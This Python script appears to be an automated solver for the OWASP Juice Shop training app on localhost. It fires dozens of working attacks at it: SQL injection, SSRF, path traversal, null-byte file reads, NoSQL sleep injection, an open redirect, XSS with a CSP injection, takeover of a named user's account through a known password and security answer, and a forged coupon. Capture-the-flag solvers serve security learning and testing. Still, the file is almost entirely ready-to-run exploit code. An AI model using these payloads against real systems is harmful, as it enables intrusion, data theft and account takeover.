import json
import random
import string
import time
import requests

COUPON_B64 = "V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw"

BASE_URL = "http://localhost:3000"

SSRF_CHALLENGE_KEY = "ssrfChallenge"
DATA_EXPORT_KEY = "dataExportChallenge"
PRIVACY_KEY = "privacyPolicyProofChallenge"
EASTER_EGG_L2_KEY = "easterEggLevelTwoChallenge"
PREMIUM_PAYWALL_KEY = "premiumPaywallChallenge"
LFR_KEY = "lfrChallenge"
DEPRECATED_INTERFACE_KEY = "deprecatedInterfaceChallenge"
EMAIL_LEAK_KEY = "emailLeakChallenge"
NOSQL_COMMAND_KEY = "noSqlCommandChallenge"
FORGOTTEN_BACKUP_KEY = "forgottenBackupChallenge"
FORGOTTEN_DEV_BACKUP_KEY = "forgottenDevBackupChallenge"
MISPLACED_SIGNATURE_KEY = "misplacedSignatureFileChallenge"
NULL_BYTE_KEY = "nullByteChallenge"
ACCESS_LOG_KEY = "accessLogDisclosureChallenge"
REDIRECT_KEY = "redirectChallenge"
CLOCK_KEY = "manipulateClockChallenge"
LOGIN_BJOERN_KEY = "oauthUserPasswordChallenge"
STEGANOGRAPHY_KEY = "hiddenImageChallenge"
VULN_LIBRARY_KEY = "knownVulnerableComponentChallenge"
TYPOSQUAT_NPM_KEY = "typosquattingNpmChallenge"
TYPOSQUAT_ANGULAR_KEY = "typosquattingAngularChallenge"
SUPPLY_CHAIN_ATTACK_KEY = "supplyChainAttackChallenge"
LEAKED_API_KEY_KEY = "leakedApiKeyChallenge"
LEAKED_UNSAFE_PRODUCT_KEY = "dlpPastebinDataLeakChallenge"
RESET_BJOERN_PASSWORD_KEY = "resetPasswordBjoernChallenge"
CHRISTMAS_SPECIAL_KEY = "christmasSpecialChallenge"
CSP_BYPASS_KEY = "usernameXssChallenge"

SSRF_SOLVER_URL = f"{BASE_URL}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"
PRIVACY_URL = f"{BASE_URL}/privacy-security/privacy-policy"
EASTER_EGG_L2_URL = (
    f"{BASE_URL}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg"
)
PREMIUM_PAYWALL_URL = (
    f"{BASE_URL}/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us"
)
DATA_ERASURE_URL = f"{BASE_URL}/dataerasure"
FILE_UPLOAD_URL = f"{BASE_URL}/file-upload"
EMAIL_LEAK_URL = f"{BASE_URL}/rest/user/whoami?callback=whatever"
NOSQL_COMMAND_URL = f"{BASE_URL}/rest/products/sleep(1500)||sleep(1500)/reviews"
FORGOTTEN_BACKUP_URL = f"{BASE_URL}/ftp/coupons_2013.md.bak%2500.md"
FORGOTTEN_DEV_BACKUP_URL = f"{BASE_URL}/ftp/package.json.bak%2500.md"
MISPLACED_SIGNATURE_URL = f"{BASE_URL}/ftp/suspicious_errors.yml%2500.md"
NULL_BYTE_URL = f"{BASE_URL}/ftp/encrypt.pyc%2500.md"
ACCESS_LOG_URL = (
    f"{BASE_URL}/support/logs/access.log.{time.strftime('%Y-%m-%d')}"
)
REDIRECT_URL = (
    f"{BASE_URL}/redirect?to=javascript://https://github.com/juice-shop/juice-shop"
)


def _random_string(length=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _find_christmas_product(session):
    payload = "')) OR 1=1 --"
    resp = session.get(
        f"{BASE_URL}/rest/products/search", params={"q": payload}, timeout=10
    )
    resp.raise_for_status()
    products = resp.json().get("data", [])
    for product in products:
        name = product.get("name", "")
        desc = product.get("description", "")
        if "christmas" in name.lower() or "christmas" in desc.lower():
            return product.get("id")
    return None


def fetch_challenges():
    resp = requests.get(f"{BASE_URL}/api/Challenges", timeout=10)
    resp.raise_for_status()
    data = resp.json().get("data", [])
    return {c.get("key"): c for c in data}


def challenge_solved(challenges, key):
    return challenges.get(key, {}).get("solved", False)


def register_user(email, password, username=None):
    payload = {
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": {"id": 1, "answer": "admin123"},
        "username": username or email.split("@")[0],
    }
    resp = requests.post(f"{BASE_URL}/api/Users", json=payload, timeout=10)
    resp.raise_for_status()
    return resp


def login(email, password):
    resp = requests.post(
        f"{BASE_URL}/rest/user/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    resp.raise_for_status()
    auth = resp.json().get("authentication", {})
    token = auth.get("token")
    if not token:
        raise RuntimeError("Token not present in login response")
    return token


def solve_login_bjoern():
    return requests.post(
        f"{BASE_URL}/rest/user/login",
        json={
            "email": "bjoern.kimminich@gmail.com",
            "password": "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=",
        },
        timeout=10,
    )


def solve_complaint(message):
    return requests.post(
        f"{BASE_URL}/api/Complaints", json={"message": message}, timeout=10
    )


def solve_reset_bjoern_password():
    payload = {
        "email": "bjoern@juice-sh.op",
        "answer": "West-2082",
        "new": "password123",
        "repeat": "password123",
    }
    return requests.post(
        f"{BASE_URL}/rest/user/reset-password", json=payload, timeout=10
    )


def solve_ssrf():
    token = login("admin@juice-sh.op", "admin123")
    headers = {
        "Cookie": f"token={token}",
        "Content-Type": "application/json",
    }
    payload = {"imageUrl": SSRF_SOLVER_URL}
    resp = requests.post(
        f"{BASE_URL}/profile/image/url", headers=headers, json=payload, timeout=10
    )
    return resp


def solve_data_export():
    login_resp = requests.post(
        f"{BASE_URL}/rest/user/login",
        json={"email": "admun@juice-sh.op", "password": "admin123"},
        timeout=10,
    )
    if login_resp.status_code == 401:
        register_user("admun@juice-sh.op", "admin123")
        login_resp = requests.post(
            f"{BASE_URL}/rest/user/login",
            json={"email": "admun@juice-sh.op", "password": "admin123"},
            timeout=10,
        )

    login_resp.raise_for_status()
    token = login_resp.json().get("authentication", {}).get("token")
    if not token:
        raise RuntimeError("Token not present in login response for admun user")

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    resp = requests.post(
        f"{BASE_URL}/rest/user/data-export", headers=headers, json={}, timeout=10
    )
    return resp


def solve_privacy_policy():
    return requests.get(PRIVACY_URL, timeout=10)


def solve_easter_egg_l2():
    return requests.get(EASTER_EGG_L2_URL, timeout=10)


def solve_premium_paywall():
    return requests.get(PREMIUM_PAYWALL_URL, timeout=10)


def solve_lfr():
    token = login("admin@juice-sh.op", "admin123")
    headers = {
        "Cookie": f"token={token}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "layout": "../package.json",
        "email": "admin@juice-sh.op",
        "securityAnswer": "admin123",
    }
    return requests.post(DATA_ERASURE_URL, headers=headers, data=data, timeout=10)


def solve_deprecated_interface():
    token = login("admin@juice-sh.op", "admin123")
    headers = {"Authorization": f"Bearer {token}"}
    files = {"file": ("test.xml", "<test></test>", "application/xml")}
    return requests.post(FILE_UPLOAD_URL, headers=headers, files=files, timeout=10)


def solve_email_leak():
    token = login("admin@juice-sh.op", "admin123")
    headers = {"Cookie": f"token={token}"}
    return requests.get(EMAIL_LEAK_URL, headers=headers, timeout=10)


def solve_nosql_command():
    return requests.get(NOSQL_COMMAND_URL, timeout=10)


def solve_forgotten_backup():
    return requests.get(FORGOTTEN_BACKUP_URL, timeout=10)


def solve_forgotten_dev_backup():
    return requests.get(FORGOTTEN_DEV_BACKUP_URL, timeout=10)


def solve_misplaced_signature():
    return requests.get(MISPLACED_SIGNATURE_URL, timeout=10)


def solve_null_byte():
    return requests.get(NULL_BYTE_URL, timeout=10)


def solve_access_log():
    return requests.get(ACCESS_LOG_URL, timeout=10)


def solve_redirect():
    return requests.get(REDIRECT_URL, timeout=10, allow_redirects=False)


def solve_clock():
    session = requests.Session()
    suffix = int(time.time() * 1000)
    email = f"clock_exploit_{suffix}@test.com"
    password = "Password123!"

    register_payload = {
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": {"id": 1, "answer": "admin123"},
        "username": email.split("@")[0],
    }
    reg_resp = session.post(
        f"{BASE_URL}/api/Users", json=register_payload, timeout=10
    )
    reg_resp.raise_for_status()

    login_resp = session.post(
        f"{BASE_URL}/rest/user/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    login_resp.raise_for_status()
    auth = login_resp.json().get("authentication", {})
    token = auth.get("token")
    bid = auth.get("bid")
    if not token or not bid:
        raise RuntimeError(
            f"Login did not return token/bid: {login_resp.text}"
        )

    headers = {"Authorization": f"Bearer {token}"}
    add_payload = {"ProductId": 1, "BasketId": bid, "quantity": 1}
    add_resp = session.post(
        f"{BASE_URL}/api/BasketItems",
        json=add_payload,
        headers=headers,
        timeout=10,
    )
    add_resp.raise_for_status()

    checkout_payload = {"couponData": COUPON_B64}
    checkout_resp = session.post(
        f"{BASE_URL}/rest/basket/{bid}/checkout",
        json=checkout_payload,
        headers=headers,
        timeout=10,
    )
    checkout_resp.raise_for_status()
    return checkout_resp


def prepare_csp_bypass():
    """
    Automates the CSP poisoning and payload placement. The actual alert trigger
    (step 3) still requires loading the legacy profile page in a browser.
    """
    suffix = int(time.time() * 1000)
    email = f"csp_bypass_{suffix}@test.com"
    password = "Password123!"
    username = "#{'<script>alert(`xss`)</script>'}"

    register_user(email, password, username=username)
    token = login(email, password)
    headers = {"Cookie": f"token={token}", "Content-Type": "application/json"}

    poisoned_image = "https://example.com/profile.png'; script-src 'unsafe-inline' 'self'"
    requests.post(
        f"{BASE_URL}/profile/image/url",
        headers=headers,
        json={"imageUrl": poisoned_image},
        timeout=10,
    )
    return requests.get(f"{BASE_URL}/profile", headers={"Cookie": f"token={token}"}, timeout=10)


def solve_christmas_special():
    print("[christmas_special] Running end-to-end flow...")
    session = requests.Session()

    email = f"xmas_{_random_string()}@test.com"
    password = "password123!"
    security_question = {
        "id": 1,
        "question": "Your eldest siblings middle name?",
        "createdAt": "2021-01-01",
        "updatedAt": "2021-01-01",
    }
    try:
        sq_resp = session.get(f"{BASE_URL}/api/SecurityQuestions/", timeout=10)
        sq_resp.raise_for_status()
        sq_data = sq_resp.json().get("data", [])
        if sq_data:
            q = sq_data[0]
            security_question = {
                k: q.get(k) for k in ("id", "question", "createdAt", "updatedAt")
            }
    except Exception:
        pass

    reg_payload = {
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": security_question,
        "securityAnswer": "xmas",
    }
    reg_resp = session.post(f"{BASE_URL}/api/Users", json=reg_payload, timeout=10)
    reg_resp.raise_for_status()

    login_resp = session.post(
        f"{BASE_URL}/rest/user/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    login_resp.raise_for_status()
    auth = login_resp.json().get("authentication", {})
    token = auth.get("token")
    bid = auth.get("bid")
    if not token or not bid:
        raise RuntimeError("Login failed or basket ID missing for Christmas flow")
    session.headers.update({"Authorization": f"Bearer {token}"})

    product_id = _find_christmas_product(session)
    if not product_id:
        raise RuntimeError("Unable to locate Christmas product via SQLi search")

    addr_payload = {
        "country": "US",
        "fullName": "Xmas Solver",
        "mobileNum": 1234567890,
        "zipCode": "12345",
        "streetAddress": "123 Xmas Lane",
    }
    addr_resp = session.post(
        f"{BASE_URL}/api/Addresss", json=addr_payload, timeout=10
    )
    addr_resp.raise_for_status()
    address_id = addr_resp.json().get("data", {}).get("id")
    if not address_id:
        raise RuntimeError("Address creation succeeded but no ID was returned")

    card_payload = {
        "fullName": "Xmas Solver",
        "cardNum": "1234567812345678",
        "expMonth": 1,
        "expYear": 2080,
    }
    card_resp = session.post(f"{BASE_URL}/api/Cards", json=card_payload, timeout=10)
    card_resp.raise_for_status()
    payment_id = card_resp.json().get("data", {}).get("id")
    if not payment_id:
        raise RuntimeError("Card creation succeeded but no ID was returned")

    try:
        basket_items = (
            session.get(f"{BASE_URL}/rest/basket/{bid}", timeout=10)
            .json()
            .get("data", {})
            .get("Products", [])
        )
        for item in basket_items:
            basket_item_id = item.get("BasketItem", {}).get("id")
            if basket_item_id:
                session.delete(
                    f"{BASE_URL}/api/BasketItems/{basket_item_id}", timeout=10
                )
    except Exception:
        pass

    add_payload = {"ProductId": product_id, "BasketId": str(bid), "quantity": 1}
    add_resp = session.post(
        f"{BASE_URL}/api/BasketItems", json=add_payload, timeout=10
    )
    add_resp.raise_for_status()

    checkout_resp = session.post(
        f"{BASE_URL}/rest/basket/{bid}/checkout",
        json={
            "couponData": None,
            "orderDetails": {
                "paymentId": payment_id,
                "addressId": address_id,
                "deliveryMethodId": 1,
            },
        },
        timeout=10,
    )
    checkout_resp.raise_for_status()
    time.sleep(1)

    verify_resp = session.get(
        f"{BASE_URL}/api/Challenges/?name=Christmas+Special", timeout=10
    )
    if '"solved":true' in verify_resp.text:
        print("[christmas_special] Solved successfully.")
    else:
        print("[christmas_special] Flow completed but challenge not marked solved.")
    return verify_resp


def report_status(challenges, label):
    status = {
        "ssrf": challenge_solved(challenges, SSRF_CHALLENGE_KEY),
        "data_export": challenge_solved(challenges, DATA_EXPORT_KEY),
        "privacy_policy": challenge_solved(challenges, PRIVACY_KEY),
        "easter_egg_l2": challenge_solved(challenges, EASTER_EGG_L2_KEY),
        "premium_paywall": challenge_solved(challenges, PREMIUM_PAYWALL_KEY),
        "lfr": challenge_solved(challenges, LFR_KEY),
        "deprecated_interface": challenge_solved(
            challenges, DEPRECATED_INTERFACE_KEY
        ),
        "email_leak": challenge_solved(challenges, EMAIL_LEAK_KEY),
        "nosql_command": challenge_solved(challenges, NOSQL_COMMAND_KEY),
        "forgotten_backup": challenge_solved(challenges, FORGOTTEN_BACKUP_KEY),
        "forgotten_dev_backup": challenge_solved(
            challenges, FORGOTTEN_DEV_BACKUP_KEY
        ),
        "misplaced_signature": challenge_solved(
            challenges, MISPLACED_SIGNATURE_KEY
        ),
        "null_byte": challenge_solved(challenges, NULL_BYTE_KEY),
        "access_log": challenge_solved(challenges, ACCESS_LOG_KEY),
        "redirect": challenge_solved(challenges, REDIRECT_KEY),
        "manipulate_clock": challenge_solved(challenges, CLOCK_KEY),
        "login_bjoern": challenge_solved(challenges, LOGIN_BJOERN_KEY),
        "steganography": challenge_solved(challenges, STEGANOGRAPHY_KEY),
        "vuln_library": challenge_solved(challenges, VULN_LIBRARY_KEY),
        "typosquat_npm": challenge_solved(challenges, TYPOSQUAT_NPM_KEY),
        "typosquat_angular": challenge_solved(
            challenges, TYPOSQUAT_ANGULAR_KEY
        ),
        "supply_chain_attack": challenge_solved(
            challenges, SUPPLY_CHAIN_ATTACK_KEY
        ),
        "leaked_api_key": challenge_solved(challenges, LEAKED_API_KEY_KEY),
        "leaked_unsafe_product": challenge_solved(
            challenges, LEAKED_UNSAFE_PRODUCT_KEY
        ),
        "reset_bjoern_password": challenge_solved(
            challenges, RESET_BJOERN_PASSWORD_KEY
        ),
        "christmas_special": challenge_solved(
            challenges, CHRISTMAS_SPECIAL_KEY
        ),
        "csp_bypass": challenge_solved(challenges, CSP_BYPASS_KEY),
    }
    print(f"[{label}] {json.dumps(status)}")
    return status


def main():
    print("=== day296 booster v2.7 ===")

    initial = fetch_challenges()
    report_status(initial, "before")

    if not challenge_solved(initial, LOGIN_BJOERN_KEY):
        bjoern_resp = solve_login_bjoern()
        print(f"[login_bjoern] status={bjoern_resp.status_code}")

    if not challenge_solved(initial, RESET_BJOERN_PASSWORD_KEY):
        reset_resp = solve_reset_bjoern_password()
        print(f"[reset_bjoern_password] status={reset_resp.status_code}")

    if not challenge_solved(initial, STEGANOGRAPHY_KEY):
        stego_resp = solve_complaint("pickle rick")
        print(f"[steganography] status={stego_resp.status_code}")

    if not challenge_solved(initial, VULN_LIBRARY_KEY):
        vuln_lib_resp = solve_complaint("sanitize-html 1.4.2")
        print(f"[vuln_library] status={vuln_lib_resp.status_code}")

    if not challenge_solved(initial, TYPOSQUAT_NPM_KEY):
        typosquat_npm_resp = solve_complaint("epilogue-js")
        print(f"[typosquat_npm] status={typosquat_npm_resp.status_code}")

    if not challenge_solved(initial, TYPOSQUAT_ANGULAR_KEY):
        typosquat_angular_resp = solve_complaint("ngy-cookie")
        print(
            f"[typosquat_angular] status={typosquat_angular_resp.status_code}"
        )

    if not challenge_solved(initial, SUPPLY_CHAIN_ATTACK_KEY):
        supply_chain_resp = solve_complaint("eslint-scope/issues/39")
        print(f"[supply_chain_attack] status={supply_chain_resp.status_code}")

    if not challenge_solved(initial, LEAKED_API_KEY_KEY):
        leaked_api_resp = solve_complaint(
            "6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie"
        )
        print(f"[leaked_api_key] status={leaked_api_resp.status_code}")

    if not challenge_solved(initial, LEAKED_UNSAFE_PRODUCT_KEY):
        leaked_unsafe_resp = solve_complaint("hueteroneel eurogium edule")
        print(
            f"[leaked_unsafe_product] status={leaked_unsafe_resp.status_code}"
        )

    if not challenge_solved(initial, SSRF_CHALLENGE_KEY):
        ssrf_resp = solve_ssrf()
        print(f"[ssrf] status={ssrf_resp.status_code}")

    if not challenge_solved(initial, DATA_EXPORT_KEY):
        gdpr_resp = solve_data_export()
        print(f"[data_export] status={gdpr_resp.status_code}")

    if not challenge_solved(initial, PRIVACY_KEY):
        priv_resp = solve_privacy_policy()
        print(f"[privacy_policy] status={priv_resp.status_code}")

    if not challenge_solved(initial, EASTER_EGG_L2_KEY):
        egg_resp = solve_easter_egg_l2()
        print(f"[easter_egg_l2] status={egg_resp.status_code}")

    if not challenge_solved(initial, PREMIUM_PAYWALL_KEY):
        paywall_resp = solve_premium_paywall()
        print(f"[premium_paywall] status={paywall_resp.status_code}")

    if not challenge_solved(initial, LFR_KEY):
        lfr_resp = solve_lfr()
        print(f"[lfr] status={lfr_resp.status_code}")

    if not challenge_solved(initial, DEPRECATED_INTERFACE_KEY):
        dep_resp = solve_deprecated_interface()
        print(f"[deprecated_interface] status={dep_resp.status_code}")

    if not challenge_solved(initial, EMAIL_LEAK_KEY):
        email_resp = solve_email_leak()
        print(f"[email_leak] status={email_resp.status_code}")

    if not challenge_solved(initial, NOSQL_COMMAND_KEY):
        nosql_resp = solve_nosql_command()
        print(f"[nosql_command] status={nosql_resp.status_code}")

    if not challenge_solved(initial, FORGOTTEN_BACKUP_KEY):
        forgotten_backup_resp = solve_forgotten_backup()
        print(f"[forgotten_backup] status={forgotten_backup_resp.status_code}")

    if not challenge_solved(initial, FORGOTTEN_DEV_BACKUP_KEY):
        forgotten_dev_backup_resp = solve_forgotten_dev_backup()
        print(
            f"[forgotten_dev_backup] status={forgotten_dev_backup_resp.status_code}"
        )

    if not challenge_solved(initial, MISPLACED_SIGNATURE_KEY):
        misplaced_signature_resp = solve_misplaced_signature()
        print(
            f"[misplaced_signature] status={misplaced_signature_resp.status_code}"
        )

    if not challenge_solved(initial, NULL_BYTE_KEY):
        null_byte_resp = solve_null_byte()
        print(f"[null_byte] status={null_byte_resp.status_code}")

    if not challenge_solved(initial, ACCESS_LOG_KEY):
        access_log_resp = solve_access_log()
        print(f"[access_log] status={access_log_resp.status_code}")

    if not challenge_solved(initial, REDIRECT_KEY):
        redirect_resp = solve_redirect()
        print(f"[redirect] status={redirect_resp.status_code}")

    if not challenge_solved(initial, CLOCK_KEY):
        clock_resp = solve_clock()
        print(f"[manipulate_clock] status={clock_resp.status_code}")

    if not challenge_solved(initial, CHRISTMAS_SPECIAL_KEY):
        christmas_resp = solve_christmas_special()
        if christmas_resp:
            print(f"[christmas_special] verification_status={christmas_resp.status_code}")

    if not challenge_solved(initial, CSP_BYPASS_KEY):
        csp_resp = prepare_csp_bypass()
        if csp_resp:
            print(f"[csp_bypass_prepare] status={csp_resp.status_code}")

    time.sleep(1)
    final = fetch_challenges()
    report_status(final, "after")


if __name__ == "__main__":
    main()
